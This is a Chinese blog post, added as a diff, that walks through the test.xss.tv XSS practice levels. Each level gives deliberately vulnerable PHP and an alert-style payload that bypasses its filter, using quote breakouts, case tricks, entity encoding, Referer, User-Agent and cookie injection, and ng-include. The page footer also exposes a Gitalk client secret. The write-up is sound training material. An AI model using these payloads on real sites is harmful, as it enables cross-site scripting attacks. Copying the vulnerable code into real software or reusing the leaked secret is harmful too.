@@ -1,0 +1,540 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>XSS弹窗练习 : http://test.xss.tv | MokYan</title>
+<link rel="shortcut icon" href="https://M0kY4n.github.io111/favicon.ico?v=1625225841143">
+<link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.css" rel="stylesheet">
+<link rel="stylesheet" href="https://M0kY4n.github.io111/styles/main.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/go.min.js"></script>
+<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+        crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+        crossorigin="anonymous"></script>
+
+<!-- DEMO JS -->
+<script src="media/scripts/index.js"></script>
+
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            MokYan
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+    </div>
+</nav>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    XSS弹窗练习 : http://test.xss.tv
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-01-07 ·
+                    </time>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/ov9f1l9vPE/" class="post-tags">
+                            # Web安全
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/ljoh2fRtL/" class="post-tags">
+                            # JavaScript
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/OhHVLfc7Bs/" class="post-tags">
+                            # XSS
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="xss弹窗闯关练习">XSS弹窗闯关练习</h1>
+<br>
+<h2 id="前言">前言</h2>
+<p>靶机源码与 <a href="http://test.xss.tv">http://test.xss.tv</a> 的题目是一样的,并且删除了后面几道已经失效的Flash XSS题目,本文连接来自<a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-41">@国光</a>博客下《XSS从零开始》文章的连接</p>
+<blockquote>
+<p>项目地址: https://github.com/sqlsec/xssgame</p>
+</blockquote>
+<br>
+<br>
+<h2 id="0x00-先热个身吧">0x00 先热个身吧</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户:&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+</code></pre>
+<p>没有对$str进行任何过滤,echo 直接执行了JS代码</p>
+<pre><code class="language-html">payload:
+?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x01-窒息的操作">0x01 窒息的操作</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>双引号闭合文本框的value,插入JS代码</p>
+<pre><code class="language-html">payload:
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x02-这该咋办啊">0x02 这该咋办啊</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<p>单引号引号闭合文本框的value,插入JS DOM事件代码</p>
+<pre><code class="language-html">payload:
+' onclick=alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x03-生无可恋">0x03 生无可恋</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对$str进行了字符串过滤.将'&lt;' , '&gt;'替换成空格,仍然使用0x02的payload ,只不过这题是将双引号进行闭合,再插入 JS DOM事件代码</p>
+<pre><code class="language-html">payload:
+&quot; onclick=alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x04-没错又是搜索">0x04 没错又是搜索</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对$str先进行转换小写,然后将&quot;&lt;script&quot;替换成&quot;&lt;scr_ipt&quot; , &quot;on&quot;替换成&quot;o_n&quot;,思路是将双引号和括号闭合,插入超链接a标签,利用href属性执行 JS代码</p>
+<pre><code class="language-html">payloda:
+&quot;&gt; &lt;a href=javascript:alert(1)&gt; //
+</code></pre>
+<br>
+<br>
+<h2 id="0x05-嗯-还是搜索">0x05 嗯 还是搜索</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题进行诸多过滤,但是没有进行大小写限制,所以使用大写0x04的payload进行绕过</p>
+<pre><code class="language-html">payloda:
+&quot;&gt; &lt;a Href=javascript:alert(1)&gt; //
+</code></pre>
+<br>
+<br>
+<h2 id="0x06-猜一猜下面题目还有搜索嘛">0x06 猜一猜下面题目还有搜索嘛</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题相对于第六题,过滤替换成空,写进行了大小写限制,但是程序只是运行一次,所以可以将标签双写进行绕过</p>
+<pre><code class="language-html">payload:
+&quot;&gt; &lt;scrSCRIPTipt&gt;alert(1)&lt;/scrSCRIPTipt&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x07-老铁要和我换友链嘛">0X07 老铁要和我换友链嘛？</h2>
+<pre><code class="language-php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">小</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">限</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">和</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">滤</mi><mo separator="true">,</mo><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">经</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">滤</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">str进行了小写限制和过滤,但是经过过滤后的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">的</span></span></span></span>str7使用在 a标签的href属性上面,href属性可以使用JavaScript协议来执行JS代码</p>
+<pre><code class="language-html">payload:
+JavaScrip&amp;#x74;:alert(1)
+
+因为&quot;script&quot;会被过滤替换成&quot;scr_ipt&quot;,所以将字母进行编码HTML实体,HTML实体在浏览器解析时会进行解码还原字符
+</code></pre>
+<br>
+<br>
+<h2 id="0x08-添加友连again">0x08 添加友连again</h2>
+<pre><code class="language-php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+if(false===strpos($str7,'http://'))
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+        }
+else
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}
+?&gt;
+</code></pre>
+<p>本题与第八题基本相似,但是加入了一个限制,传入的值必须包含&quot;http://&quot;,但是没有限制出现的位置,所以只要传入的值包含就行</p>
+<pre><code class="language-html">payload:
+JavaScrip&amp;#x74;:alert(1) // http://
+</code></pre>
+<br>
+<br>
+<h2 id="0x09-嗯-搜索又出现了">0x09 嗯 搜索又出现了</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题没有文本框,看代码发现是被设置隐藏了,所以需要将属性进行重写覆盖,对于$str11进行了'&lt;' , '&gt;'过滤,因此使用JS DOM代码事件进行弹窗</p>
+<pre><code class="language-javascript">payload:
+t_sort=&quot; type=text onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x10-为什么这么多搜索呢">0x10 为什么这么多搜索呢</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_REFERER'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题依旧没有文本框 , 但是查看代码是发现 , $str11传值的地方不在URL , 而是在请求头的<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">REFERER</a>里面,需要伪造REFERER进行攻击</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-referer.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">payload
+t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x11-黑人问号">0x11 黑人问号</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_USER_AGENT'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题与第十一题 相似 , 不过本题$str11的传值的地方在请求头的UA里面 , 依旧需要伪造攻击,payload依旧是第十一题的payload</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-user-agent.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">payload
+t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x12-做题好爽啊">0x12 做题好爽啊</h2>
+<pre><code class="language-php">&lt;?php
+setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE[&quot;user&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>不多说,一条payload打三题😅😅,本题伪造cookie即可,传值变量名记得改一下</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-cookie.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">user=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x13-恭喜你快要通关了">0x13 恭喜你快要通关了</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;src&quot;];
+echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
+?&gt;
+</code></pre>
+<p><strong>题目提供的Angular JS的链接已经失效,需要替换连接</strong></p>
+<p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
+<pre><code class="language-js">level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;&quot;
+</code></pre>
+<br>
+<br>
+<h2 id="0x14-厉害了-word哥">0x14 厉害了 Word哥</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
+$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<p>本题不仅过滤了script,还过滤了空格,因此使用其他其他DOM事件且使用一下制符替换空格即可</p>
+<table>
+<thead>
+<tr>
+<th>制符</th>
+<th>URL编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>换行(LF) : LineFeed</td>
+<td>%0A</td>
+</tr>
+<tr>
+<td>回车(CR) : CreTurn</td>
+<td>%0D</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-js">payload:
+&lt;img%0asrc=x%0aonerror=alert(1)&gt;
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://M0kY4n.github.io111/post/zhuan-zai-or-chang-jian-waf-lan-jie-ye-mian-hui-zong/" class="post-title gt-a-link">
+                    [转载] | 常见WAF拦截页面汇总
+                </a>
+            </div>
+        
+
+        
+            
+                <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '33314f7248b5c9af3dd7',
+    clientSecret: 'a00f05259046ad817d64c59027a0388812fe40b7',
+    repo: 'MokYan.github.io',
+    owner: 'MokYan',
+    admin: ['MokYan'],
+    id: location.pathname,      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">The more you know, the more you don't know</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+                <a href="https://weibo.com/2125865220/profile?topnav=1&amp;wvr=6" target="_blank">
+                    <i class="fab fa-weibo gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://www.zhihu.com/people/damo-18-66" target="_blank">
+                    <i class="fab fa-zhihu gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+    </div>
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a href="https://M0kY4n.github.io111/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+    hljs.initHighlightingOnLoad()
+</script>
+
+
+    </div>
+</div>
+</body>
+</html>
